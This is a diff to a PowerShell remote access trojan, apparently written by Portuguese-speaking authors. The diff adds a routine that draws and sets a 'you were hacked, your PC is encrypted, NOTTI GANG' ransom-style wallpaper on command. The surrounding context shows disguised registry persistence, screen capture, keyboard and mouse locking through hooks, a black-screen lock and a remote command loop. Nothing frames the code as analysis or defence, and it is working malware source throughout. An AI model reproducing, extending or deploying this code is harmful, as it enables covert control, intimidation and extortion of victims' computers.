@@ -16,7 +16,24 @@ $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUp
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
 $debugLog = "$env:TEMP\rat_debug.log"
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-$wallpaperPath = "$env:TEMP\wallpaper_temp.bmp"
+$wallpaperPath = "$env:TEMP\wallpaper_hack.bmp"
+
+# ===== TEXTO DO WALLPAPER HACKEADO =====
+$wallpaperText = @"
+VOCE FOI
+
+HACKEADO!
+
+SEU PC TA
+
+CRIPTOGRAFADO!
+
+CRYPTO-LOCKED
+
+ANLGUUR
+
+NOTTI GANG
+"@
 
 # ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
@@ -195,7 +212,94 @@ function Get-ScreenCapture {
     }
 }
 
-# ===== FUNÇÃO PARA WALLPAPER =====
+# ===== FUNÇÃO PARA CRIAR WALLPAPER HACKEADO =====
+function Create-HackWallpaper {
+    try {
+        Write-DebugLog "=" * 60
+        Write-DebugLog "CRIANDO WALLPAPER HACKEADO"
+        Write-DebugLog "=" * 60
+        
+        # Dimensões
+        $width = 1920
+        $height = 1080
+        
+        # Criar bitmap
+        $bitmap = New-Object System.Drawing.Bitmap $width, $height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        
+        # Fundo preto
+        $graphics.Clear([System.Drawing.Color]::Black)
+        
+        # Configurar fontes
+        $fontGrande = New-Object System.Drawing.Font("Arial Black", 60, [System.Drawing.FontStyle]::Bold)
+        $fontMedio = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
+        $fontPequeno = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
+        
+        $brushVermelho = [System.Drawing.Brushes]::Red
+        $brushBranco = [System.Drawing.Brushes]::White
+        $brushAmarelo = [System.Drawing.Brushes]::Orange
+        
+        # Desenhar linhas
+        $graphics.DrawString("VOCE FOI", $fontGrande, $brushVermelho, 200, 100)
+        $graphics.DrawString("HACKEADO!", $fontGrande, $brushVermelho, 200, 180)
+        
+        $graphics.DrawString("SEU PC TA", $fontMedio, $brushBranco, 200, 300)
+        $graphics.DrawString("CRIPTOGRAFADO!", $fontMedio, $brushBranco, 200, 370)
+        
+        $graphics.DrawString("CRYPTO-LOCKED", $fontMedio, $brushAmarelo, 200, 470)
+        
+        $graphics.DrawString("ANLGUUR", $fontPequeno, $brushBranco, 200, 570)
+        $graphics.DrawString("NOTTI GANG", $fontGrande, $brushVermelho, 200, 650)
+        
+        # Adicionar bordas
+        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red, 5)
+        $graphics.DrawRectangle($pen, 50, 50, $width - 100, $height - 100)
+        $pen.Width = 2
+        $pen.Color = [System.Drawing.Color]::White
+        $graphics.DrawRectangle($pen, 70, 70, $width - 140, $height - 140)
+        
+        # Salvar imagem
+        $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        Write-DebugLog "Wallpaper criado em: $wallpaperPath"
+        return $true
+    } catch {
+        Write-DebugLog "Erro ao criar wallpaper: $_"
+        return $false
+    }
+}
+
+# ===== FUNÇÃO PARA ALTERAR WALLPAPER =====
+function Set-Wallpaper {
+    try {
+        Write-DebugLog "Aplicando wallpaper no sistema"
+        
+        $code = @'
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    
+    public static void Set(string path) {
+        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
+    }
+}
+'@
+        Add-Type -TypeDefinition $code -ErrorAction Stop
+        [Wallpaper]::Set($wallpaperPath)
+        
+        Write-DebugLog "Wallpaper aplicado com sucesso"
+        return $true
+    } catch {
+        Write-DebugLog "Erro ao aplicar wallpaper: $_"
+        return $false
+    }
+}
+
+# ===== FUNÇÃO WALLPAPER VIA URL (FALLBACK) =====
 function Set-WallpaperFromUrl {
     param([string]$ImageUrl)
     
@@ -393,14 +497,12 @@ function Power-Control {
 
 # ===== FUNÇÕES DE LOCK =====
 
-# Variáveis globais para controle de lock
 $script:mouseLocked = $false
 $script:mouseThread = $null
 $script:blackScreenForm = $null
 $script:keyboardHook = $null
 $script:lockActive = $false
 
-# TRAVAR MOUSE
 function Lock-Mouse {
     try {
         if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
@@ -435,7 +537,6 @@ function Unlock-Mouse {
     }
 }
 
-# TELA PRETA
 function Black-Screen {
     try {
         $ps = [powershell]::Create()
@@ -470,7 +571,6 @@ function Unlock-Screen {
     }
 }
 
-# TRAVAR TECLADO
 function Lock-Keyboard {
     try {
         $keyboardCode = @'
@@ -531,7 +631,6 @@ function Unlock-Keyboard {
     }
 }
 
-# LOCK TOTAL (TUDO JUNTO)
 function Lock-Total {
     try {
         Lock-Mouse | Out-Null
@@ -609,6 +708,13 @@ while ($true) {
                 $writer.WriteLine((Lock-Total))
             } elseif ($cmd -eq "unlock_total") {
                 $writer.WriteLine((Unlock-Total))
+            } elseif ($cmd -eq "set_wallpaper_hack") {
+                if (Create-HackWallpaper) {
+                    Set-Wallpaper
+                    $writer.WriteLine("WALLPAPER_HACK_SET")
+                } else {
+                    $writer.WriteLine("WALLPAPER_ERROR")
+                }
             } elseif ($cmd -match "^set_wallpaper (.+)$") {
                 $url = $matches[1]
                 $result = Set-WallpaperFromUrl -ImageUrl $url
